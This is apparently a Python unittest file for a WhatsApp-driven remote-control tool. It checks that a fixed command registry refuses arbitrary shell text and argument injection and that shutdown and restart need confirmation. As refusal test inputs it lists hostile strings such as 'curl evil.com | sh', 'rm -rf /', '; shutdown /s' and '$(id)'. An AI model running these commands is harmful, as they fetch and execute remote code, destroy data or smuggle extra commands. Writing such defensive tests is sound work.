"""Phase 10 tests: the safe command registry.

The claim: there is no path from a WhatsApp message to arbitrary shell text.
"""
from __future__ import annotations

import subprocess
import sys
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from remote_control import commands
from remote_control.commands import (REGISTRY, SHELL_REFUSAL, CommandError,
                                     SafeCommand, describe, lookup, run)


class TestNoArbitraryShell(unittest.TestCase):

    def test_an_unknown_command_gets_the_exact_refusal(self):
        for attempt in ("format C:", "powershell -c whoami", "rm -rf /",
                        "curl evil.com | sh", "", "   "):
            with self.assertRaises(CommandError) as ctx:
                run(attempt)
            self.assertEqual(str(ctx.exception), SHELL_REFUSAL, attempt)

    def test_no_command_is_ever_a_shell_string(self):
        for cmd in REGISTRY.values():
            self.assertIsInstance(cmd.argv, tuple, cmd.name)
            self.assertGreater(len(cmd.argv), 0, cmd.name)

    def test_the_module_never_uses_shell_true(self):
        source = Path(commands.__file__).read_text(encoding="utf-8")
        # Prose may name the hazard; only real code lines are a defect.
        code = [line for line in source.splitlines()
                if not line.lstrip().startswith(("#", "*", '"""'))]
        for line in code:
            self.assertNotIn("shell=True", line, line)
            self.assertNotIn("os.system", line, line)
            self.assertNotIn("eval(", line, line)

    def test_user_text_cannot_be_appended_to_a_command(self):
        cmd = REGISTRY["lock"]
        with self.assertRaises(CommandError):
            cmd.build("; shutdown /s")

    def test_injection_into_a_choice_argument_is_refused(self):
        cmd = SafeCommand(name="t", argv=("echo.exe", "{arg}"), summary="t",
                          choices=("on", "off"))
        for attempt in ("on; rm -rf /", "on && whoami", "ON", "on ", "$(id)"):
            with self.assertRaises(CommandError, msg=attempt):
                cmd.build(attempt)
        self.assertEqual(cmd.build("on"), ["echo.exe", "on"])

    def test_whatsapp_cannot_add_a_command(self):
        """There is no register/add function — the registry is a literal."""
        for forbidden in ("def register", "def add_command", "REGISTRY["):
            source = Path(commands.__file__).read_text(encoding="utf-8")
            self.assertNotIn(forbidden + " =", source, forbidden)


class TestDangerousCommands(unittest.TestCase):

    def test_dangerous_commands_refuse_to_run_unconfirmed(self):
        for name in ("shutdown", "restart", "sleep"):
            self.assertTrue(REGISTRY[name].dangerous, name)
            with self.assertRaises(CommandError) as ctx:
                run(name)
            self.assertIn("confirmation", str(ctx.exception))

    def test_a_dangerous_command_does_not_reach_subprocess_when_unconfirmed(self):
        with mock.patch.object(commands.subprocess, "run") as spawn:
            with self.assertRaises(CommandError):
                run("shutdown")
        self.assertFalse(spawn.called)

    def test_power_commands_give_a_delay_so_they_can_be_cancelled(self):
        for name in ("shutdown", "restart"):
            self.assertIn("/t", REGISTRY[name].argv, name)
        self.assertIn("cancel_shutdown", REGISTRY)

    def test_there_is_no_remote_unlock_or_password_command(self):
        source = Path(commands.__file__).read_text(encoding="utf-8").lower()
        for forbidden in ("password", "unlock", "credential", "sam", "bitlocker"):
            self.assertNotIn(forbidden, source, forbidden)


class TestExecution(unittest.TestCase):

    def test_a_safe_command_runs_and_returns_output(self):
        output = run("top_processes")
        self.assertTrue(output.strip())

    def test_a_confirmed_dangerous_command_is_allowed_through(self):
        with mock.patch.object(commands.subprocess, "run",
                               return_value=mock.Mock(returncode=0, stdout="",
                                                      stderr="")) as spawn:
            run("shutdown", allow_dangerous=True)
        self.assertTrue(spawn.called)
        self.assertEqual(spawn.call_args.args[0][0], "shutdown.exe")

    def test_a_missing_executable_is_reported_honestly(self):
        with mock.patch.object(commands.subprocess, "run",
                               side_effect=FileNotFoundError):
            with self.assertRaises(CommandError) as ctx:
                run("uptime")
        self.assertIn("not available", str(ctx.exception))

    def test_a_hanging_command_is_killed_not_left_running(self):
        with mock.patch.object(
                commands.subprocess, "run",
                side_effect=subprocess.TimeoutExpired("x", 1)):
            with self.assertRaises(CommandError) as ctx:
                run("uptime")
        self.assertIn("too long", str(ctx.exception))

    def test_every_command_has_a_timeout(self):
        for cmd in REGISTRY.values():
            self.assertGreater(cmd.timeout, 0, cmd.name)
            self.assertLessEqual(cmd.timeout, 60, cmd.name)


class TestDescription(unittest.TestCase):

    def test_the_list_names_every_command_and_flags_the_dangerous_ones(self):
        text = describe()
        for name in REGISTRY:
            self.assertIn(name, text)
        self.assertIn("needs confirmation", text)

    def test_lookup_is_case_insensitive_and_tolerates_spacing(self):
        self.assertIsNotNone(lookup("  LOCK "))
        self.assertIsNone(lookup("nope"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
